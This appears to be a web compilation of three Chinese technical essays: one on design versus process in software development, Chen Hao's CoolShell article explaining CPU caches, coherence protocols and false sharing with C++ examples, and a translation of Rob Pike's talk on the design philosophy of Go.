模型的产生是柔性的，主要源于灵感；过程的执行是刚性的，主要源于逻辑。苹果砸在牛顿的脑袋上能砸出万有引力模型，砸在我们脑袋上却只是“哎呦”一声；但一个苹果3元钱，两个苹果2*3=6元钱却在牛顿和我们面前是平等的。迷信灵感和迷信逻辑是两个错误的极端，孔子讲“天下国家可均也，爵禄可辞也，白刃可蹈也，中庸不可能也”，任何一项技能的高级阶段都是关于“度”的艺术。如同光具有波粒二象性，软件开发也具有艺术创作和工业生产的二象性，它包含了柔性的设计和刚性的过程。越是不成熟的前沿领域越表现出柔性特征；越是成熟的一般领域越表现出工业生产的特征。因此，一个以新产品为主的创业型公司应当更注重设计，更需要画家、诗人般的创造型人才；而业务成熟产品稳定的大公司应当更注重过程，更需要踏踏实实的生产线工人似的人才。但在当今这个瞬息万变的信息时代，即使是世界500强的大公司也越来越不稳定，越来越需要创新才能适应，所以即使大公司也不可忽视软件开发的柔性特征。同时，我们也不能迷信模型，过程同样可以成为企业的核心竞争力，比如：富士康。虚虚实实，实实虚虚，其妙无穷。老外做Nike品牌（虚），我们做代工生产（实），高额利润被老外拿走了；我们经营航空公司（虚），老外生产波音飞机（实）高价卖给我们，高额利润又被老外拿走了。靠虚取胜还是靠实取胜？这是个问题^_^
或许我对于模型柔性的描述不太让人满意，人们多习惯于有章可循的感觉，即便不是死板的知识，起码要找个“在某某思想的指导下”才觉得心里有着落。或许还有人说，模型的确重要，那么我们能不能有一个过程、模式或套路来推导出模型呢？比如，现在非常流行的从用户需求出发的分析模式，即“分析需求，抽象出共性，共性是本质的，本质是稳定的”，这类模式的特点符合人们希望找到套路的心理，一看就明白，容易操作，有成就感。我不否认这类模式的确可以得出可用的软件设计，沿用成熟的模型也未尝不可。但我们应该明白，心中的世界远比现实的世界更广大更美妙。世界是多元的，用户需求、成熟模型等直接可见的东西只代表了某几个维度的视图，设计者心中应当有更多的维度！用户需要一个文本编辑器，是设计者心中的世界决定了他交出的作品是Vi，还是Emacs，亦或是Notepad。亨利·福特说：“如果你问用户需要什么，他会告诉你一匹更快的马”。汽车源于福特心中的世界，这是一个比只有马的世界更多彩的世界。乔布斯是一个不重视市场调研的人，iPod，iPhone，iPad都不是发个问卷，做个市场调查看看用户需要什么的结果。Apple是乔布斯心中的世界在现实中的投影！所以，请打破“从用户需求出发”，“从模式出发”的迷信，释放你的想象力，让自己心中的世界去包容现实的世界吧！
每个人心中都有一个属于自己的世界，牛顿运动定律是牛顿心中的世界，相对论是爱因斯坦心中的世界。哪一个才是本来的世界呢？有没有本来的世界呢？本来的世界是什么样子呢？… 老子给我们启示“道可道，非常道”，说得清，道得明，想得到的都不是永恒的真理，所以真理不可言说，对真理的探索永远没有止境……# 与程序员相关的CPU缓存知识作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn好久没有写一些微观方面的文章了，今天写一篇关于CPU Cache相关的文章，这篇文章比较长，主要分成这么几个部分：基础知识、缓存的命中、缓存的一致性、相关的代码示例和延伸阅读。其中会讲述一些多核 CPU 的系统架构以及其原理，包括对程序性能上的影响，以及在进行并发编程的时候需要注意到的一些问题。这篇文章我会尽量地写简单和通俗易懂一些，主要是讲清楚相关的原理和问题，而对于一些细节和延伸阅读我会在文章最后会给出相关的资源。因为无论你写什么样的代码都会交给CPU来执行，所以，如果你想写出性能比较高的代码，这篇文章中提到的技术还是值得认真学习的。另外，千万别觉得这些东西没用，这些东西非常有用，十多年前就是这些知识在性能调优上帮了我的很多大忙，从而跟很多人拉开了差距……
目录* 基础知识   * 缓存的命中   * 缓存的一致性   * 程序性能     * 示例一     * 示例二     * 示例三     * 示例四     * 示例五   * 延伸阅读#### 基础知识首先，我们都知道现在的CPU多核技术，都会有几级缓存，老的CPU会有两级内存（L1和L2），新的CPU会有三级内存（L1，L2，L3 ），如下图所示：其中：* L1缓存分成两种，一种是指令缓存，一种是数据缓存。L2缓存和L3缓存不分指令和数据。   * L1和L2缓存在每一个CPU核中，L3则是所有CPU核心共享的内存。   * L1、L2、L3的越离CPU近就越小，速度也越快，越离CPU远，速度也越慢。再往后面就是内存，内存的后面就是硬盘。我们来看一些他们的速度：* L1 的存取速度： **4 个CPU时钟周期**   * L2 的存取速度： **11 个CPU时钟周期**   * L3 的存取速度： **39 个CPU时钟周期**   * RAM内存的存取速度 **：107 个CPU时钟周期**我们可以看到，L1的速度是RAM的27倍，但是L1/L2的大小基本上也就是KB级别的，L3会是MB级别的。例如：Intel Core i7-8700K ，是一个6核的CPU，每核上的L1是64KB（数据和指令各32KB），L2 是 256K，L3有2MB（我的苹果电脑是 Intel Core i9-8950HK，和Core i7-8700K的Cache大小一样）。
我们的数据就从内存向上，先到L3，再到L2，再到L1，最后到寄存器进行CPU计算。为什么会设计成三层？这里有下面几个方面的考虑：* 一个方面是物理速度，如果要更大的容量就需要更多的晶体管，除了芯片的体积会变大，更重要的是大量的晶体管会导致速度下降，因为访问速度和要访问的晶体管所在的位置成反比，也就是当信号路径变长时，通信速度会变慢。这部分是物理问题。   * 另外一个问题是，多核技术中，数据的状态需要在多个CPU中进行同步，并且，我们可以看到，cache和RAM的速度差距太大，所以，多级不同尺寸的缓存有利于提高整体的性能。这个世界永远是平衡的，一面变得有多光鲜，另一面也会变得有多黑暗。建立这么多级的缓存，一定就会引入其它的问题，这里有两个比较重要的问题，* 一个是比较简单的缓存的命中率的问题。   * 另一个是比较复杂的缓存更新的一致性问题。尤其是第二个问题，在多核技术下，这就很像分布式的系统了，要对多个地方进行更新。#### 缓存的命中在说明这两个问题之前。我们需要要解一个术语 Cache Line。缓存基本上来说就是把后面的数据加载到离自己近的地方，对于CPU来说，它是不会一个字节一个字节的加载的，因为这非常没有效率，一般来说都是要一块一块的加载的，对于这样的一块一块的数据单位，术语叫“Cache Line”，一般来说，一个主流的CPU的Cache Line 是 64 Bytes（也有的CPU用32Bytes和128Bytes），64Bytes也就是16个32位的整型，这就是CPU从内存中捞数据上来的最小数据单位。
比如：Cache Line是最小单位（64Bytes），所以先把Cache分布多个Cache Line，比如：L1有32KB，那么，32KB/64B = 512 个 Cache Line。一方面，缓存需要把内存里的数据放到放进来，英文叫 CPU Associativity。Cache的数据放置的策略决定了内存中的数据块会拷贝到CPU Cache中的哪个位置上，因为Cache的大小远远小于内存，所以，需要有一种地址关联的算法，能够让内存中的数据可以被映射到Cache中来。这个有点像内存地址从逻辑地址向物理地址映射的方法，但不完全一样。基本上来说，我们会有如下的一些方法。* 一种方法是，任何一个内存地址的数据可以被缓存在任何一个Cache Line里，这种方法是最灵活的，但是，如果我们要知道一个内存是否存在于Cache中，我们就需要进行O(n)复杂度的Cache遍历，这是很没有效率的。   * 另一种方法，为了降低缓存搜索算法，我们需要使用像Hash Table这样的数据结构，最简单的hash table就是做“求模运算”，比如：我们的L1 Cache有512个Cache Line，那么，公式：`（内存地址 mod 512）* 64` 就可以直接找到所在的Cache地址的偏移了。但是，这样的方式需要我们的程序对内存地址的访问要非常地平均，不然冲突就会非常严重。这成了一种非常理想的情况了。   * 为了避免上述的两种方案的问题，于是就要容忍一定的hash冲突，也就出现了 N-Way 关联。也就是把连续的N个Cache Line绑成一组，然后，先把找到相关的组，然后再在这个组内找到相关的Cache Line。这叫 Set Associativity。如下图所示。
对于 N-Way 组关联，可能有点不好理解，这里个例子，并多说一些细节（不然后面的代码你会不能理解），Intel 大多数处理器的L1 Cache都是32KB，8-Way 组相联，Cache Line 是64 Bytes。这意味着，* 32KB的可以分成，32KB / 64 = 512 条 Cache Line。   * 因为有8 Way，于是会每一Way 有 512 / 8 = 64 条 Cache Line。   * 于是每一路就有 64 x 64 = 4096 Byts 的内存。为了方便索引内存地址，* **Tag** ：每条 Cache Line 前都会有一个独立分配的 24 bits来存的 tag，其就是内存地址的前24bits   * **Index** ：内存地址后续的6个bits则是在这一Way的是Cache Line 索引，2^6 = 64 刚好可以索引64条Cache Line   * **Offset** ：再往后的6bits用于表示在Cache Line 里的偏移量如下图所示：（图片来自《Cache: a place for concealment and safekeeping》）
当拿到一个内存地址的时候，先拿出中间的 6bits 来，找到是哪组。然后，在这一个8组的cache line中，再进行O(n) n=8 的遍历，主是要匹配前24bits的tag。如果匹配中了，就算命中，如果没有匹配到，那就是cache miss，如果是读操作，就需要进向后面的缓存进行访问了。L2/L3同样是这样的算法。而淘汰算法有两种，一种是随机一种是LRU。现在一般都是以LRU的算法（通过增加一个访问计数器来实现）这也意味着：* L1 Cache 可映射 36bits 的内存地址，一共 2^36 = 64GB的内存   * 当CPU要访问一个内存的时候，通过这个内存中间的6bits 定位是哪个set，通过前 24bits 定位相应的Cache Line。   * 就像一个hash Table的数据结构一样，先是O(1)的索引，然后进入冲突搜索。   * 因为中间的 6bits 决定了一个同一个set，所以，对于一段连续的内存来说，每隔4096的内存会被放在同一个组内，导致缓存冲突。此外，当有数据没有命中缓存的时候，CPU就会以最小为Cache Line的单元向内存更新数据。当然，CPU并不一定只是更新64Bytes，因为访问主存实在是太慢了，所以，一般都会多更新一些。好的CPU会有一些预测的技术，如果找到一种pattern的话，就会预先加载更多的内存，包括指令也可以预加载。这叫 Prefetching 技术 （参看，Wikipedia 的 Cache Prefetching 和 纽约州立大学的 Memory Prefetching）。比如，你在for- loop访问一个连续的数组，你的步长是一个固定的数，内存就可以做到prefetching。（注：指令也是以预加载的方式执行，参看本站的《代码执行的效率》中的第三个示例）
了解这些细节，会有利于我们知道在什么情况下有可以导致缓存的失效。#### 缓存的一致性对于主流的CPU来说，缓存的写操作基本上是两种策略（参看本站《缓存更新的套路》），* 一种是Write Back，写操作只要在cache上，然后再flush到内存上。   * 一种是Write Through，写操作同时写到cache和内存上。为了提高写的性能，一般来说，主流的CPU（如：Intel Core i7/i9）采用的是Write Back的策略，因为直接写内存实在是太慢了。好了，现在问题来了，如果有一个数据 x 在 CPU 第0核的缓存上被更新了，那么其它CPU核上对于这个数据 x 的值也要被更新，这就是缓存一致性的问题。（当然，对于我们上层的程序我们不用关心CPU多个核的缓存是怎么同步的，这对上层的代码来说都是透明的）一般来说，在CPU硬件上，会有两种方法来解决这个问题。* **Directory 协议** 。这种方法的典型实现是要设计一个集中式控制器，它是主存储器控制器的一部分。其中有一个目录存储在主存储器中，其中包含有关各种本地缓存内容的全局状态信息。当单个CPU Cache 发出读写请求时，这个集中式控制器会检查并发出必要的命令，以在主存和CPU Cache之间或在CPU Cache自身之间进行数据同步和传输。   * **Snoopy 协议** 。这种协议更像是一种数据通知的总线型的技术。CPU Cache通过这个协议可以识别其它Cache上的数据状态。如果有数据共享的话，可以通过广播机制将共享数据的状态通知给其它CPU Cache。这个协议要求每个CPU Cache 都可以 ** _“_ 窥探 _”_** 数据事件的通知并做出相应的反应。如下图所示，有一个Snoopy Bus的总线。
****因为Directory协议是一个中心式的，会有性能瓶颈，而且会增加整体设计的复杂度。而Snoopy协议更像是微服务+消息通讯，所以，现在基本都是使用Snoopy的总线的设计。这里，我想多写一些细节，因为这种微观的东西，让人不自然地就会跟分布式系统关联起来，在分布式系统中我们一般用Paxos/Raft这样的分布式一致性的算法。而在CPU的微观世界里，则不必使用这样的算法，原因是因为CPU的多个核的硬件不必考虑网络会断会延迟的问题。所以，CPU的多核心缓存间的同步的核心就是要管理好数据的状态就好了。这里介绍几个状态协议，先从最简单的开始，MESI协议，这个协议跟那个著名的足球运动员梅西没什么关系，其主要表示缓存数据有四个状态：Modified（已修改）, Exclusive（独占的）,Shared（共享的），Invalid（无效的）。这些状态的状态机如下所示（有点复杂，你可以先不看，这个图就是想告诉你状态控制有多复杂）：下面是个示例（如果你想看一下动画演示的话，这里有一个网页（MESI Interactive Animations），你可以进行交互操作，这个动画演示中使用的Write Through算法）：
当前操作 | CPU0 | CPU1 | Memory | 说明   ---|---|---|---|---   1) CPU0 read(x) |  x=1 (E) |  | x=1 | 只有一个CPU有 x 变量，   所以，状态是 Exclusive   2) CPU1 read(x) |  x=1 (S) | x=1(S) | x=1 | 有两个CPU都读取 x 变量，   所以状态变成 Shared   3) CPU0 write(x,9) |  x=9 (M) | x=1(I) | x=1 | 变量改变，在CPU0中状态   变成 Modified，在CPU1中   状态变成 Invalid   4) 变量 x 写回内存 |  x=9 (M) | X=1(I) | x=9 | 目前的状态不变   5) CPU1 read(x) |  x=9 (S) | x=9(S) | x=9 | 变量同步到所有的Cache中，   状态回到SharedMESI 这种协议在数据更新后，会标记其它共享的CPU缓存的数据拷贝为Invalid状态，然后当其它CPU再次read的时候，就会出现 cache miss 的问题，此时再从内存中更新数据。从内存中更新数据意味着20倍速度的降低。我们能不能直接从我隔壁的CPU缓存中更新？是的，这就可以增加很多速度了，但是状态控制也就变麻烦了。还需要多来一个状态：Owner(宿主)，用于标记，我是更新数据的源。于是，出现了 MOESI 协议
MOESI协议的状态机和演示示例我就不贴了（有兴趣可以上Berkeley上看看相关的课件）， **我们只需要理解MOESI协议允许 CPU Cache 间同步数据，于是也降低了对内存的操作** ，性能是非常大的提升，但是控制逻辑也非常复杂。顺便说一下，与 MOESI 协议类似的一个协议是 MESIF，其中的 F 是 Forward，同样是把更新过的数据转发给别的 CPU Cache 但是，MOESI 中的 Owner 状态 和MESIF 中的 Forward 状态有一个非常大的不一样—— **Owner状态下的数据是dirty的，还没有写回内存，Forward状态下的数据是clean的，可以丢弃而不用另行通知** 。需要说明的是，AMD用MOESI，Intel用MESIF。所以，F 状态主要是针对 CPU L3 Cache 设计的（前面我们说过，L3是所有CPU核心共享的）。（相关的比较可以参看StackOverlow上这个问题的答案）#### 程序性能了解了我们上面的这些东西后，我们来看一下对于程序的影响。##### 示例一首先，假设我们有一个64M长的数组，设想一下下面的两个循环：const int LEN = 64*1024*1024;     int *arr = new int[LEN];
for (int i = 0; i < LEN; i += 2) arr[i] *= i;for (int i = 0; i < LEN; i += 8) arr[i] *= i;按我们的想法来看，第二个循环要比第一个循环少4倍的计算量，其应该也是要快4倍的。但实际跑下来并不是， **在我的机器上，第一个循环需要127毫秒，第二个循环则需要121毫秒，相差无几** 。这里最主要的原因就是 Cache Line，因为CPU会以一个Cache Line 64Bytes最小时单位加载，也就是16个32bits的整型，所以，无论你步长是2还是8，都差不多。而后面的乘法其实是不耗CPU时间的。##### 示例二我们再来看一个与缓存命中率有关的代码，我们以一定的步长`increment` 来访问一个连续的数组。我们测试一下，在下表中， 表头是步长，也就是每次跳多少个整数，而纵向是这个数组可以跳几次（你可以理解为要几条Cache Line），于是表中的任何一项代表了这个数组有多少，而且步长是多少。比如：横轴是 512，纵轴是4，意思是，这个数组有 `4*512 = 2048` 个长度，访问时按512步长访问，也就是访问其中的这几项：`[0, 512, 1024, 1536]` 这四项。
表中同的项是，是循环1000万次的时间，单位是“微秒”（除以1000后是毫秒）| count |   1    |   16  |  512  | 1024  |     ------------------------------------------     |     1 |  17539 | 16726 | 15143 | 14477 |     |     2 |  15420 | 14648 | 13552 | 13343 |     |     3 |  14716 | 14463 | 15086 | 17509 |     |     4 |  18976 | 18829 | 18961 | 21645 |     |     5 |  23693 | 23436 | 74349 | 29796 |     |     6 |  23264 | 23707 | 27005 | 44103 |     |     7 |  28574 | 28979 | 33169 | 58759 |     |     8 |  33155 | 34405 | 39339 | 65182 |     |     9 |  37088 | 37788 | 49863 | **156745** |     |    10 |  41543 | 42103 | 58533 | **215278** |     |    11 |  47638 | 50329 | 66620 | **335603** |     |    12 |  49759 | 51228 | 75087 | **305075** |     |    13 |  53938 | 53924 | 77790 | **366879** |     |    14 |  58422 | 59565 | 90501 | **466368** |     |    15 |  62161 | 64129 | 90814 | **525780** |     |    16 |  67061 | 66663 | 98734 | **440558** |     |    17 |  71132 | 69753 | **171203** | **506631** |     |    18 |  74102 | 73130 | **293947** | **550920** |
我们可以看到，从 `[9，1024]` 以后，时间显著上升。包括 `[17，512]` 和 `[18,512]` 也显著上升。这是因为，我机器的 L1 Cache 是 32KB, 8 Way 的，前面说过，8 Way的有64组，每组8个Cache Line，当for- loop步长超过1024个整型，也就是正好 4096 Bytes时，也就是导致内存地址的变化是变化在高位的24bits上，而低位的12bits变化不大，尤其是中间6bits没有变化，导致全部命中同一组set，导致大量的cache 冲突，导致性能下降，时间上升。而 [16, 512]也是一样的，其中的几步开始导致L1 Cache开始冲突失效。##### 示例三接下来，我们再来看个示例。下面是一个二维数组的两种遍历方式，一个逐行遍历，一个是逐列遍历，这两种方式在理论上来说，寻址和计算量都是一样的，执行时间应该也是一样的。const int row = 1024;     const int col = 512     int matrix[row][col];//逐行遍历     int sum_row=0;     for(int _r=0; _r<row; _r++) {     for(int _c=0; _c<col; _c++){     sum_row += matrix[_r][_c];     }     }
//逐列遍历     int sum_col=0;     for(int _c=0; _c<col; _c++) {     for(int _r=0; _r<row; _r++){     sum_col += matrix[_r][_c];     }     }然而，并不是，在我的机器上，得到下面的结果。* 逐行遍历：0.081ms   * 逐列遍历：1.069ms执行时间有十几倍的差距。其中的原因，就是逐列遍历对于CPU Cache 的运作方式并不友好，所以，付出巨大的代价。##### 示例四接下来，我们来看一下多核下的性能问题，参看如下的代码。两个线程在操作一个数组的两个不同的元素（无需加锁），线程循环1000万次，做加法操作。在下面的代码中，我高亮了一行，就是`p2`指针，要么是`p[1]`，或是 `p[30]`，理论上来说，无论访问哪两个数组元素，都应该是一样的执行时间。int p[32];int *p1 = &p[0];     int *p2 = &p[1]; // int *p2 = &p[30];thread t1(fn, p1);     thread t2(fn, p2);
然而，并不是，在我的机器上执行下来的结果是：* 对于 `p[0]` 和 `p[1]` ：560ms   * 对于 `p[0]` 和 `p[30]`：104ms这是因为 `p[0]` 和 `p[1]` 在同一条 Cache Line 上，而 `p[0]` 和 `p[30]` 则不可能在同一条Cache Line 上 ，CPU的缓存最小的更新单位是Cache Line，所以， **这导致虽然两个线程在写不同的数据，但是因为这两个数据在同一条Cache Line上，就会导致缓存需要不断进在两个CPU的L1/L2中进行同步，从而导致了5倍的时间差异** 。##### 示例五接下来，我们再来看一下另外一段代码：我们想统计一下一个数组中的奇数个数，但是这个数组太大了，我们希望可以用多线程来完成这个统计。下面的代码中， **我们为每一个线程传入一个 id ，然后通过这个 id 来完成对应数组段的统计任务。这样可以加快整个处理速度** 。int total_size = 16 * 1024 * 1024; //数组长度     int* test_data = new test_data[total_size]; //数组     int nthread = 6; //线程数（因为我的机器是6核的）     int result[nthread]; //收集结果的数组
然而，在执行过程中， **你会发现，6个线程居然跑不过1个线程** 。因为根据上面的例子你知道 `result[]` 这个数组中的数据在一个Cache Line中，所以，所有的线程都会对这个 Cache Line 进行写操作，导致所有的线程都在不断地重新同步 `result[]` 所在的 Cache Line，所以，导致 6 个线程还跑不过一个线程的结果。这叫 **False Sharing** 。优化也很简单，使用一个线程内的变量。int c = 0; //使用临时变量，没有cache line的同步了     for ( int i = start; i < end; ++i ) {     if (test_data[i] % 2 != 0 ) ++c;     }     result[id] = c;     }我们把两个程序分别在 1 到 32 个线程上跑一下，得出的结果画一张图如下所示（横轴是线程数，纵轴是完成统的时间，单位是微秒）：上图中，我们可以看到，灰色的曲线就是第一种方法，橙色的就是第二种（用局部变量的）方法。当只有一个线程的时候，两个方法相当，基本没有什么差别，但是在线程数增加的时候的时候，你会发现，第二种方法的性能提高的非常快。直到到达6个线程的时候，开始变得稳定（前面说过，我的CPU是6核的）。而第一种方法无论加多少线程也没有办法超过第二种方法。因为第一种方法不是CPU Cache 友好的。也就是说，第二种方法， **只要我的CPU核数足够多，就可以做到线性的性能扩展，让每一个CPU核都跑起来，而第一种则不能** 。
篇幅问题，示例就写到这里，相关的代码参看我的Github相关仓库。#### 延伸阅读* Wikipedia : CPU Cache    * 经典文章：Gallery of Processor Cache Effects （这篇文章中的测试已经有点过时了，但是这篇文章中所说的那些东西还是非常适用的）   * Effective C++作者 Scott Meyers 的演讲 CPU Caches and Why You Care （Youtube，PPT）   * 美国私立大学Swarthmore的教材 Cache Architecture and Design   * 经典文章：What Every Programmer Should Know About Memory （这篇文章非常经典，但是开篇太晦涩了，居然告诉你晶体管内的构造，第三章和第六章是重点）   * Nonblocking Algorithms and Scalable Multicore Programming （英文版，中文版）   * Github上的一个代码库 hardware-effects 里面有受CPU影响的程序的演示   * Optimizing for instruction caches （Part 1，Part 2， Part 3）   * 经典数据：Latency Numbers Every Programmer Should Know   * 关于Java的可以看一下这篇Optimizing Memory Access With CPU Cache 或是 Writing cache-friendly code
总之，这个CPU Cache的调优技术不是什么新鲜的东西，只要Google就能找到有很多很多文章……（全文完）# 少即是极多作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn【 **感谢网友@innocentim** (Twitter) **投稿** 】这是一篇翻译练习。力图保留原意。若有不准确处，求速速指出。猛击此处（墙）看原文。作者为Rob Pike，贝尔实验室来的大牛，现在就职于Google。他主导了Go语言的创建工作。下面是正文————————————————正文分隔线——————————————这是我在2012年6月的Go SF上演讲的文本。这是一个个人演讲。 我承认，虽然面前的团队让Go诞生并延续，但是我的观点并不代表任何其他Go语言小组成员的意见。 我也想感谢Go SF的组织者提供这个和你们交流的机会。几星期前我被问起:“你在推出Go的过程中遇到的最大的惊奇是什么？”我立即意识到了答案: 虽然我们希望C++程序员意识到Go是个较好的选择，但是令人意外的是，大多数Go程序员来自Python和Ruby这样的动态语言，而很少有来自C++的。
我们——Ken，Robert和我——是C++程序员(译者: Ken也用C++？)，当时在为解决我们所写的这类软件产生的问题设计一个新的语言。 这似乎有点自相矛盾，因为别的C++程序员根本不关心这些问题，更不会去设计一个语言。我今天想说的是关于那些激发我们创造Go的事情，和为什么它本不应令我们如此惊讶。 我保证这些内容更多与Go相关而不是C++，所以即使你不很了解C++你也能跟得上。回答可以这样归结: 你认为”少即是多”呢，还是”少就是少”？这里有个比喻，将以真实故事的形式给出。 贝尔实验室中心原来发放3位数号码: 物理研究是111，计算科学研究是127，如此这般。 1980年代早期，一个便笺飞过来说”鉴于你们对研究的理解有所加深，将为你们的号码多加上一位，以便更好地体现你们的工作”。 所以我们中心的号码变成了1127。 Ron Hardin半当真地开玩笑说如果我们真的理解我们的世界更好一点的话，我们将丢掉一位数字，将127变成27。 当然主管没听到这个笑话(这也不是我们希望的)，但是我想这里面有点值得思考的东西。 少即是多。 你理解得越好，你将变得越简洁。先记住这句话。回到2007年9月，我在做一个庞大的Google C++项目的细微但核心的部分。 开发必须交互进行，但是我这部分在我们的Google编译集群上要编译45分钟。 同时，有个消息传过来说一群在C++社区的Google员工将开一场讲座，介绍即将到来的C++0x(现在称为C++11)。
在那场持续一小时的讲座中，我们听说了诸如计划中的35个新特性的说法——事实上还有更多，但是那场讲座只说有35个。 有些特性当然是细微的，但是讲座中谈到的至少是足够重要的。 提到的特性中，有些十分微妙并难以理解，比如右值引用(rvalue references); 有些特别符合C++范儿，比如可变参数模板(variadic templates); 还有些十分疯狂，比如用户定义的字面量(user-defined literals)。那时候我问了自己一个问题: C++社区真的觉得C++错在没有足够多的特性么？ 显然，从Ron Hardin的笑话的角度看，简化语言将比添加新特性取得更好的效果。 当然，对C++来说这很不靠谱，但是先记住这点。在这场讲座的几个月之前我做了一场讲座(你可以通过YouTube看到)，讲的是一个我1980年代做的一个玩具并发编程语言。 这个语言叫Newsqueak，而且显然地，它成为了Go的前身。在我在Google工作的过程中，我发现我丢掉了Newsqueak中的一些点子。 现在我将重新思考它们，所以我才做了那场讲座。 我相信它们会让服务器端编程变得更容易，而且Google能真正从中获益。
我真的尝试将这些点子加入到C++中，可惜失败了。 我实在难以将一组并发操作融入到C++的控制流程中去——当真融进去的话，它们将变得十分丑陋，从而难以看到优越性。 另外，C++将它变得十分臃肿(虽然我从来没真正发现C++苗条过)。 所以我放弃了这个想法。但是C++0x的讲座使我再次思考。 一件事十分困扰我——我相信也困扰着Ken和Robert——C++的新内存模型居然新增了原子类型。 为这个不堪重负的类型系统加上这么个细致精巧到极致类型机制十分的不靠谱，不是么？ 将语言和今日的硬件绑在一起似乎有点目光短浅并且不明智，因为硬件过几年就有大变。那场C++0x讲座结束之后，我们回到办公室。 我开始了另一个编译(译者笑)，转过转过我的椅子，面对Robert，然后开始问一些尖锐的问题。 在编译完成之前，我们拉拢了Ken，并决定做些什么。 我们再也不想写C++了，并且我们——尤其是我——在写Google代码时，想让并发拿来就用。 同时我们也想解决”大系统编程”的问题，容后细说。我们在白板上写下一组我们需要的东西——迫切需要的那种。 我们规划出大体的轮廓，忽略了语法细节和语义。我仍然有一条碉堡了的那周的邮件线索。 这是一些摘录:
> **Robert** : 起点: C，修补一些显而易见的瑕疵，去除繁杂的东西。 新增一些特性。 > > **Rob** : 命名为’go’。 你可以为这个名字编造各种理由，但是它确实拥有很多好的特性。 它短小，易于打出。 工具么: goc，gol，goa。 > 如果有个交互式调试器/解释器，可以直接叫’go’。 代码后缀是。go。 > > **Robert** : 空接口: interface {}。 将被所有接口实现(译者: 原文如此)，并且可以取代void*。我们并没有立即全部设计出来。 比如我们花了一年多才设计出了数组(array)和切片(slice)。 不过相当一部分重要的设计在最初的几天中浮现。注意到Robert说C是起点，并非C++。 对于这点我不是很确定，不过我相信他说的是C，因为Ken在场(译者笑)。 但是最后我们并没有从C开始，这倒是真的。 我们从最初的草稿开始，仅仅从其它语言中借鉴琐碎的东西，比如运算符，各种括号和一些常见的关键字。(当然我们也借鉴了我们所知道的语言中的思想。)不管怎么说，我们破而后立，从头做起，以此来响应C++。 我们并非想做一个更好的C++，甚至不是一个更好的C。 它仅仅是一个对我们所关心的软件来说更好的语言。
最后，我们得到了既不同于C也不同于C++的东西，甚至比许多人意识到的还要不同。 我列了一个对于C和C++的Go的重要的简化的列表:* 常规的语法(不需要一个符号表来辅助解析)   * GC机制(仅仅是GC)   * 没有头文件   * 显式依赖关系   * 没有循环依赖   * 数字常量仅仅是数字(译者: 没有类型)   * int和int32不是同种类型   * 字母大小写将确定可见性   * 任何类型都可以有方法(没有类)   * 没有子类型继承(没有子类)   * 包级别的初始化和良好定义的初始化顺序   * 同一个包的文件一起编译   * 包级别的全局定义可以以任意顺序进行   * 没有算术类型转换(常量可以弥补)   * 接口是隐式实现的(没有”implements”声明)   * 嵌入的结构体(没有类型提升和子类)   * 方法像函数一样定义(不必定义在特殊的地方)   * 方法就是函数   * 接口就是方法(没有数据)   * 方法仅仅靠名字匹配(不是靠类型)   * 没有构造函数和析构函数   * 后置增量/减量运算符仅仅是语句，而不是表达式   * 没有前置增量/减量运算符   * 赋值号是语句，不是表达式   * 表达式求值顺序在赋值和函数调用时确定(没有所谓的”sequence point”)   * 没有指针算术   * 内存总是初始化为0   * 对本地变量取地址是合法的   * 方法中没有叫this的指针   * 分段式栈   * 没有常量或其它类型的注记   * 没有模板   * 没有异常   * 内建字符串，切片和映射(map)   * 数组边界检查
并且，我相信通过这一系列的简化，Go将比C或C++更具有表现力。 少即是多。但是我们没法一下子把所有部分都做出来。 我们需要构建最基础的部分，比如说类型系统的表示，能良好应用于实际的语法，和一些无法形容的但能让库更容易相互操作的东西。我们同样增加了C或C++中没有的东西，比如切片和映射，组合字面量(？)，文件顶层的表达式(这虽是件大事，但是几乎不为人知)，反射机制，GC等等。 自然，还有并发。一个显眼的缺少的东西是类型的继承。 请允许我粗暴地对待它一分钟。早先构建Go的时候有人跟我说，他无法想象用一门没有泛型的语言工作。 正如我在别处说明的那样，我觉得这是个很诡异的言论。公平起见，他用自己的话说可能是他真的很喜欢C++中STL的那些容器。 以辩论为目的的话，我们来正面看看他的言论。他说的意味着: 他发现写一个容器，比如以int为元素类型的链表，或字符串映射是一种不能忍的重负。 我发现这是个很诡异的言论，因为我几乎没把时间花在那些个问题上，即使我在用没有泛型的语言。但是，更重要的是，他说的那些表示 _类型系统_ 将会解除这种负担。 _类型系统_ 。 不是多态函数，或语言级原语，或其它类型的辅助手段(helpers)，而仅仅是 _类型系统_ 。
这就是粘住我的那个细节。从C++或Java来Go的程序员怀念和类型系统在一起的日子，特别是带继承和子类的那部分。 也许我在类型系统方面是粗暴了些，但是我绝不觉得那套玩意非常具有表现力。我已故的朋友Alain Fournier一次告诉我说他认为学术工作的最底层是分类学。 然后信不信由你，类型继承正是分类学。 你必须决定哪个萝卜扔哪个坑里，每个类型的父类型，A是否继承B或者B是否继承A。 一个可排序的数组是一个带有sort方法的数组呢，还是一个长得像数组的排序器呢？ 如果你觉得类型系统能解决所有设计上的问题，你必须做出这个无意义的选择。我相信对编程来说那是个荒诞的思路。 真正的重点不在于事物之间的继承关系，而在于它们能提供些什么。因此，接口这个概念进入了Go。 但是它们都是主要部分——真正的Go之道——的一部分。如果C++和Java注重类型继承和类型系统的分类学，那末Go就注重组合。Doug Mcilroy，Unix管道的最终发明人，在1964年(!)写道:> 我们应该有一些机制能将程序耦合(串)起来，像花园软管那样——当我们需要另一种方式传送数据时，拧紧另外一段即可。 I/O也可以这么做。
这也是Go所提倡的道路。 Go吸收这个观点，然后把它推进得十分远。 这是一门关于(功能上的)组合和(调用上的)耦合的语言。一个显然的例子是接口是组合各部分的途径。 关键是，那些部分是什么并不重要，如果某类型实现了M方法我就可以把这个方法填到接口里去。另一个重要的例子是如何让并发性提供给我们不同的独立计算部分的组合。并且还有一种不同寻常(但十分简单)的类型组合形式: 嵌入。————————————————————————我想提一个和之前不太相关的Go设计: Go被设计为大型团队用来写大型程序的语言。这里有个概念是”大型编程”，并且不知何故C++和Java主宰了这个领域。 我相信这只是因为其历史巧合，或者是工业上的巧合。 但是被广泛接纳的观点是他们和面向对象设计有关。我压根不相信这点。 大型软件需要确定的方法，但是更重要的是它需要强依赖性管理，干净的接口抽象和优越的文档工具。 C++没一点做得好的(虽然Java明显要好很多)。我们还不知道Go语言能做到何种程度，因为现在还没有足够的软件是用Go写的。 但是我非常有信心于Go将会成为一个优越的大型编程语言。 时间会说明一切的。————————————————————————
